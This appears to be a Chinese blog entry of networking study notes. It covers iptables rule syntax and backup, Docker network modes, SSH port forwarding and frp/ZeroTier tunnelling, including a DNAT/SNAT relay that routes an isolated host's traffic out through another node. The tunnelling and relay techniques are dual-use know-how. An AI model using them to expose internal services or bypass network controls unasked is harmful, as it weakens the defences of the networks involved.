<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center.png" class title="在这里插入图片描述">

<p>可以看出，如果是外部主机发送数据包给防火墙本机，数据将会经过 PREROUTING 链与 INPUT 链；如果是防火墙本机发送数据包到外部主机，数据将会经过 OUTPUT 链与 POSTROUTING 链；如果防火墙作为路由负责转发数据，则数据将经过 PREROUTING 链、FORWARD 链以及 POSTROUTING 链。</p>
<h4 id="命令与扩展"><a href="#命令与扩展" class="headerlink" title="命令与扩展"></a>命令与扩展</h4><ul>
<li>查看规则</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -nvL</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以单独-L也可以加--line-number</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>添加规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.5 -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改规则</p>
</li>
</ul>
<p>-R：替换</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -R INPUT 6 -s 194.168.1.5 -j ACCEPT</span><br></pre></td></tr></table></figure>

<ul>
<li>删除规则</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT 6 -s 194.168.1.5 -j ACCEPT</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者</span></span><br><span class="line">iptables -D INPUT 6</span><br></pre></td></tr></table></figure>

<ul>
<li>清空表上的所有规则，默认为filter表：<blockquote>
<p>iptables -F</p>
</blockquote>
</li>
</ul>
<p>链上操作规则，A追加，I前面插入，D删除，R替换，N新建一个自定义链，例如：</p>
<ul>
<li><p>在第5条规则前插入禁止非192.168.1.0&#x2F;24访问80端口</p>
<blockquote>
<p>iptables -I INPUT 5 -p tcp –dport 80 ! -s 192.168.1.0&#x2F;24 -j DROP</p>
</blockquote>
</li>
<li><p>查看某个表的所有链上的规则：</p>
<blockquote>
<p>iptables -t nat -L -n -v –line-numbers</p>
</blockquote>
</li>
<li><p>filter表，常将lo网卡和已建立连接的规则放在最前面，降低系统负担：</p>
<blockquote>
<p>iptables -A INPUT -i lo -j ACCEPT<br>iptables -A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT</p>
</blockquote>
</li>
<li><p>允许ping：</p>
<blockquote>
<p>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT</p>
</blockquote>
</li>
<li><p>允许连续范围端口：</p>
<blockquote>
<p>iptables -A INPUT -p udp –sport 1000:2000 -j ACCEPT</p>
</blockquote>
</li>
</ul>
<p>每个链都有默认规则，禁止时可以设置白名单，允许时可以设置黑名单，-P：设置链默认规则</p>
<ul>
<li>INPUT链默认禁止连接：<blockquote>
<p>iptables -P INPUT DROP</p>
</blockquote>
</li>
</ul>
<p>iptables有很多扩展，不同的扩展有不同的功能，查看文档，man iptables-extensions常用的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多端口扩展，-m multiport --dports 80,443</span></span><br><span class="line"><span class="comment">#recent扩展，每30秒最多10个连接：</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --<span class="built_in">set</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</span><br><span class="line"><span class="comment">#connlimit扩展，限制并发连接数：</span></span><br><span class="line">iptables -I INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 100 -j REJECT</span><br><span class="line"><span class="comment">#string扩展，字符串匹配禁止：</span></span><br><span class="line">iptables -I INPUT -p tcp --sport 443 -m string --string <span class="string">&quot;xunlei&quot;</span> --algo kmp -j DROP</span><br></pre></td></tr></table></figure>

<h4 id="iptables防火墙的备份与还原"><a href="#iptables防火墙的备份与还原" class="headerlink" title="iptables防火墙的备份与还原"></a>iptables防火墙的备份与还原</h4><p>CentOS 7 系统中防火墙规则默认保存在 &#x2F;etc&#x2F;sysconfig&#x2F;iptables 文件中，使用 iptables-save 将规则保存至该文件中可以实现保存防火墙规则的作用，计算机重启后会自动加载该文件中的规则。如果使用 iptables-save 将规则保存至其他位置，可以实现备份防火墙规则的作用。当防火墙规则需要做还原操作时，可以使用 iptables-restore 将备份文件直接导入当前防火墙规则。</p>
<h5 id="iptables-save命令"><a href="#iptables-save命令" class="headerlink" title="iptables-save命令"></a>iptables-save命令</h5><p>iptables-save 命令用来批量导出 Linux 防火墙规则，语法介绍如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保存在默认文件夹中（保存防火墙规则）： </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; /etc/sysconfig/iptables</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存在其他位置（备份防火墙规则）： </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; 文件名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#直接执行 iptables-save 命令：显示出当前启用的所有规则，按照 raw、mangle、nat、filter 表的顺序依次列出，如下所示：</span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save </span></span><br><span class="line"><span class="comment"># Generated by iptables-save v1.4.7 on Thu Aug 27 07:06:36 2020 </span></span><br><span class="line">*filter </span><br><span class="line">:INPUT ACCEPT [0:0] </span><br><span class="line">:FORWARD ACCEPT [0:0] </span><br><span class="line">:OUTPUT ACCEPT [602:39026]</span><br><span class="line">COMMIT </span><br><span class="line"><span class="comment"># Completed on Thu Aug 27 07:06:36 2020</span></span><br></pre></td></tr></table></figure>

<p>其中：</p>
<p>“#”号开头的表示注释；<br>“*filter”表示所在的表；<br>“：链名默认策略”表示相应的链及默认策略，具体的规则部分省略了命令名“iptables”；<br>在末尾处“COMMIT”表示提交前面的规则设置。</p>
<p>备份到其他文件中。例如文件：text，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; test </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># ls test </span></span><br><span class="line">[root@bogon ~]<span class="comment"># cat test </span></span><br><span class="line"><span class="comment"># Generated by iptables-save v1.4.7 on Thu Aug 27 07:09:47 2020</span></span><br><span class="line">*filter ......</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出nat表的规则内容，命令如下：</span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save -t nat</span></span><br></pre></td></tr></table></figure>

<h5 id="iptables-restore命令"><a href="#iptables-restore命令" class="headerlink" title="iptables-restore命令"></a>iptables-restore命令</h5><p>iptables-restore 命令可以批量导入Linux防火墙规则，同时也需要结合重定向输入来指定备份文件的位置。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-restore &lt; 文件名称</span></span><br></pre></td></tr></table></figure>

<p>注意，导入的文件必须是使用 iptables-save工具导出来的才可以。</p>
<p>先使用 iptables-restore 命令还原 text 文件，然后使用 iptables -t nat -nvL 命令查看清空的规则是否已经还原，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-restore &lt; test </span></span><br><span class="line"></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables -t nat -nvL </span></span><br><span class="line"></span><br><span class="line">Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br><span class="line"></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<h5 id="iptables-services命令"><a href="#iptables-services命令" class="headerlink" title="iptables-services命令"></a>iptables-services命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#systemctl stop firewalld</span></span><br><span class="line"><span class="comment">#systemctl disable firewalld</span></span><br><span class="line">yum -y install iptables-services</span><br><span class="line">service iptables save</span><br><span class="line">service iptables reload</span><br></pre></td></tr></table></figure>

<h4 id="iptables-完成TCP转发实验"><a href="#iptables-完成TCP转发实验" class="headerlink" title="iptables 完成TCP转发实验"></a>iptables 完成TCP转发实验</h4><p>Iptables的知识点：<br>1.就是docker的网络服务是基于iptables的，iptables -L 看到有很多docker网段相关的规则就行<br>2.某个节点能出网，master出不了网。所以看看能不能在节点搞个反向代理，把外网的admin.dnslog.bid:9002，映射到master的9002端口。</p>
<p>Master通过节点出网</p>
<p>master</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 9002 -j DNAT --to 172.17.36.146:59002</span><br><span class="line"><span class="comment">#在NAT表中，将经过防火墙的TCP流量到达9002端口的流量重定向到172.17.36.146服务器的59002端口上。例如，当外部用户访问服务器的9002端口时，该规则将会把流量重定向到172.17.36.146服务器的59002端口上，从而确保访问能够成功。这种规则的应用场景包括端口映射和负载均衡等，可以实现网络流量的灵活转发和管理。-j DNAT：指定动作为目的地址重映射</span></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 172.17.36.146 --dport 59002 -j SNAT --to 172.21.122.127</span><br><span class="line"><span class="comment">#此规则的作用是在NAT表中，当流量经过防火墙，目标IP地址为172.17.36.146且目标端口为59002时，将流量的源IP地址改为172.21.122.127。这种规则通常用于Masquerading NAT，即网络地址转换，将私有地址转换为公共地址，以实现网络访问。例如，当从172.17.36.146服务器的59002端口返回数据包时，防火墙将根据该规则将源IP地址改为172.21.122.127，以确保正确地路由回网络。 -j SNAT：指定动作为源地址重映射，即将流量的源地址改为指定的IP地址，-j表示指定动作</span></span><br><span class="line">iptables -t filter -I FORWARD -s 172.0.0.0/8 -d 0.0.0.0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#此规则的作用是在filter表中，允许通过防火墙的从172.0.0.0/8地址段到0.0.0.0/0地址段的数据包。该规则通常用于实现基于IP地址段的访问控制，例如允许内部网络访问互联网。</span></span><br></pre></td></tr></table></figure>

<p>slave</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 59002 -j DNAT --to 47.56.183.123:9002</span><br><span class="line"><span class="comment">#在NAT表中，将经过防火墙且目标端口为59002的TCP流量，重定向到47.56.183.123的9002端口</span></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 47.56.183.123 --dport 9002 -j SNAT --to 172.17.36.146</span><br><span class="line"><span class="comment">#在NAT表中，当流量经过防火墙，目标IP地址为47.56.183.123且目标端口为9002时，将流量的源IP地址改为172.17.36.146。</span></span><br><span class="line">iptables -t filter -I FORWARD -s 172.0.0.0/8 -d 0.0.0.0/0 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>在Master节点上，这两条规则的作用是将流量从master的9002端口重定向到Slave节点的59002端口，并将响应数据的源IP地址改为Master节点的IP地址，以便Master节点可以接收到响应数据。</p>
<p>在slave节点上，将流量从slave节点的59002端口重定向到外网admin.dnslog.bid的9002端口，并将响应数据的源IP地址改为slave节点的ip地址，以便slave节点可以接收到响应数据。</p>
<p>最终做到了把外网的admin.dnslog.bid:9002，映射到master的9002端口。</p>
<h3 id="Docker-容器网络和-IPtables-间的亲密关系"><a href="#Docker-容器网络和-IPtables-间的亲密关系" class="headerlink" title="Docker 容器网络和 IPtables 间的亲密关系"></a>Docker 容器网络和 IPtables 间的亲密关系</h3><h4 id="docker网络类型"><a href="#docker网络类型" class="headerlink" title="docker网络类型"></a><strong>docker网络类型</strong></h4><ul>
<li>Bridge模式</li>
</ul>
<p>bridge模式是docker默认的网络设置，此模式会为每个容器分配network namespace、设置ip等，并将一个主机的docker容器连接到一个虚拟网络上。</p>
<p>当<code>Docker</code>进程启动时，会在主机上创建一个名为<code>docker0</code>的虚拟网桥，此主机上启动的<code>Docker</code>容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。从<code>docker0</code>子网中分配一个 IP 给容器使用，并设置 docker0 的 IP 地址为容器的<strong>默认网关</strong>。在主机上创建一对虚拟网卡<code>veth pair</code>设备，Docker 将 veth pair 设备的一端放在新创建的容器中，并命名为<code>eth0</code>（容器的网卡），另一端放在主机中，以<code>vethxxx</code>这样类似的名字命名，并将这个网络设备加入到 docker0 网桥中。<code>bridge</code>模式是 docker 的默认网络模式，不写<code>–net</code>参数，就是<code>bridge</code>模式。使用<code>docker run -p</code>时，docker 实际是在<code>iptables</code>做了<code>DNAT</code>规则，实现端口转发功能。可以使用<code>iptables -vnL</code>查看。</p>
<ul>
<li>Host模式</li>
</ul>
<p>如果启动容器的时候使用<code>host</code>模式，那么这个容器将不会获得一个独立的<code>Network Namespace</code>，而是和宿主机共用一个 Network Namespace。容器将不会虚拟出自己的网卡，配置自己的 IP 等，而是使用宿主机的 IP 和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。</p>
<ul>
<li>Container模式</li>
</ul>
<p>这个模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。</p>
<ul>
<li>None模式</li>
</ul>
<p>使用<code>none</code>模式，Docker 容器拥有自己的 Network Namespace，但是，并不为Docker 容器进行任何网络配置。也就是说，这个 Docker 容器没有网卡、IP、路由等信息。需要我们自己为 Docker 容器添加网卡、配置 IP 等。</p>
<h4 id="Docker和iptables之间存在密切的关系"><a href="#Docker和iptables之间存在密切的关系" class="headerlink" title="Docker和iptables之间存在密切的关系"></a>Docker和iptables之间存在密切的关系</h4><p>在Docker中，iptables被用于创建和管理容器之间的网络规则，以及容器与外部网络的通信。当创建一个Docker容器时，Docker会自动为该容器创建一个虚拟网络接口，并使用iptables规则将该容器与其他容器或宿主机连接起来。通过iptables，容器可以相互通信，或者与外部网络进行通信。例如，当一个容器需要访问外部网络时，Docker可以使用iptables规则来实现网络地址转换（NAT）和端口映射，将容器内部的IP地址映射到宿主机的IP地址上，从而实现容器与外部网络的通信。</p>
<h3 id="使用ssh命令将内网端口发布到远程服务器"><a href="#使用ssh命令将内网端口发布到远程服务器" class="headerlink" title="使用ssh命令将内网端口发布到远程服务器"></a>使用ssh命令将内网端口发布到远程服务器</h3><p>参数解释：</p>
<p>-C：请求压缩数据</p>
<p>-f：后台执行ssh指令</p>
<p>-N：不执行远程指令，处于等待状态</p>
<p>-g：允许远程主机连接主机的转发端口</p>
<p>-L：本地转发</p>
<p>-R：远程转发</p>
<h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>确保本地机器与远端服务器都已安装SSH客户端和服务端，并确保5672端口没有被占用。</p>
<p><strong>SSH服务器配置</strong></p>
<p>在远程服务器的SSH配置文件（通常位于<code>/etc/ssh/sshd_config</code>）中，检查以下设置：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">AllowTcpForwarding</span> yes</span><br><span class="line"><span class="title class_">GatewayPorts</span> yes</span><br></pre></td></tr></table></figure>

<h4 id="命令行使用方法"><a href="#命令行使用方法" class="headerlink" title="命令行使用方法"></a>命令行使用方法</h4><p>在Linux终端中，可以使用以下命令实现端口映射：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">表示将本地的5672端口映射到远程服务器的5672端口。</span></span><br><span class="line">ssh -L 5672:localhost:5672 用户名@远程服务器地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将发往本机的80端口访问转发到174.139.9.66的8080端口</span></span><br><span class="line">ssh -C -f -N -g -L 80:174.139.9.66:8080 master@174.139.9.66</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">讲发往174.139.9.66的8080访问转发到本机的80端口</span></span><br><span class="line">ssh -C -f -N -g -R 80:174.139.9.66:8080 master@174.139.9.66</span><br></pre></td></tr></table></figure>

<p><strong>结合使用-f和-N</strong></p>
<p>当我们只是想设置端口映射，并希望SSH命令在后台运行时。命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -f -N -L 5672:localhost:5672 用户名@远程服务器地址</span><br></pre></td></tr></table></figure>

<h3 id="熟练使用zerotier、frps进行内网穿透，并设置策略"><a href="#熟练使用zerotier、frps进行内网穿透，并设置策略" class="headerlink" title="熟练使用zerotier、frps进行内网穿透，并设置策略"></a>熟练使用zerotier、frps进行内网穿透，并设置策略</h3><p><a href="https://blog.csdn.net/weixin_44786530/article/details/128283075">ZeroTier实现内网穿透详细教程，其实5分钟就可以搞定-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1MY41187VM/?spm_id_from=333.337.search-card.all.click&vd_source=5a9c70704d37d5aa98c6981b68b9d788">内网穿透-公网访问内网_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.cnblogs.com/cxfs/p/11304085.html">配置frp实现内网穿透 - 遗失的美好灬 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/cxfs/p/13071969.html">frp 实现内网穿透（Windows 版） - 遗失的美好灬 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
</search>
